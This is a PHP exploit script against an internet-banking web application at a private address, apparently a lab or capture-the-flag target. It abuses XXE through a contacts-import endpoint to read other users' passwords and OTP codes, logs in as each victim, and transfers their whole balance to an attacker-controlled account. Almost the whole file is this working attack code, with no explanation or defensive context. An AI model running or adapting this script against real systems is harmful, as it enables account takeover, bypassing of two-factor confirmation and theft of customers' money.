<?php

$login       = '100001';
$password    = 'qwerty';
$account     = '90107430600227300001';
$domain      = '10.1.76.100';
$cookie_file = '/tmp/ibank_cookie';

function login($ch, $login, $password, $domain)
{
    $postdata = http_build_query(
            array(
                'login'    => $login,
                'password' => $password,
            )
    );

    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/auth/login',
        CURLOPT_POST           => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_POSTFIELDS     => $postdata,
    ));

    return curl_exec($ch);
}

function logout($ch, $domain)
{
    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/auth/logout',
        CURLOPT_FOLLOWLOCATION => 0,
        CURLOPT_POST           => 0,
    ));

    return curl_exec($ch);
}

function XXE($ch, $domain, $sploit_file)
{
    curl_setopt_array($ch, array(
        CURLOPT_URL        => $domain . '/contacts/import',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => array(
            'contacts' => '@' . realpath($sploit_file)
        ),
    ));

    $result = curl_exec($ch);
    preg_match("~/contacts/edit/id/(\d+)~", $result, $match);

    curl_setopt_array($ch, array(
        CURLOPT_URL  => $domain . '/contacts/edit/id/' . $match[1],
        CURLOPT_POST => 0,
    ));

    $result = curl_exec($ch);

    preg_match("~<textarea[^>]*>(.*)</textarea>~", $result, $match);
    return base64_decode($match['1']);
}

@unlink($cookie_file);
file_put_contents($cookie_file, "$domain\tFALSE\t/\tFALSE\t0\tmobileInterface\ttrue", FILE_APPEND | LOCK_EX);

$ch = curl_init();

curl_setopt_array($ch, array(
    CURLOPT_HEADER         => 0,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_COOKIEJAR      => $cookie_file,
    CURLOPT_COOKIEFILE     => $cookie_file,
));

login($ch, $login, $password, $domain);
$result = XXE($ch, $domain, 'xxe_passwords.xml');

preg_match_all("~#(\d+) new password (.+)$~mU", $result, $passwords_match);

foreach ($passwords_match[1] as $key => $id) {
    logout($ch, $domain);
    $result = login($ch, $login + $id - 1, $passwords_match[2][$key], $domain);

    if (!strpos($result, '<h3>Accounts</h3>'))
        continue;

    curl_setopt_array($ch, array(
        CURLOPT_URL  => $domain . '/transactions/create',
        CURLOPT_POST => 0,
    ));

    $result = curl_exec($ch);

    if (!preg_match("~<option\s*value=\"(\d+)\">.*\(([0-9,\.]+)\s*RUB\)~msU", $result, $match))
        continue;
    
    $sum = $match[2];

    if ($sum < 1)
        continue;

    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/transactions/create',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_POST           => 1,
        CURLOPT_POSTFIELDS     => http_build_query(array(
            'from' => $match[1],
            'to'   => $account,
            'sum'  => $sum
        )),
    ));

    $result = curl_exec($ch);

    preg_match("~/transactions/delete/id/(\d+)~", $result, $match);
    $transaction_id = $match[1];

    if (strpos($result, 'Confirm transaction')) {
        $result = XXE($ch, $domain, 'xxe_messages.xml');
        preg_match_all("~#$id\s*OTP\s*code:\s*(\d+)$~mU", $result, $codes_matches);

        $code = end($codes_matches[1]);

        curl_setopt_array($ch, array(
            CURLOPT_URL            => $domain . '/transactions/confirm/id/' . $transaction_id,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_POST           => 1,
            CURLOPT_POSTFIELDS     => http_build_query(array(
                'otp' => $code
            )),
        ));
        
        $result = curl_exec($ch);
    }

    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/transactions/process/id/' . $transaction_id,
        CURLOPT_FOLLOWLOCATION => 0,
        CURLOPT_POST           => 0,
    ));
    
    echo "From $id sum $sum\n";

    $result = curl_exec($ch);
}

curl_close($ch);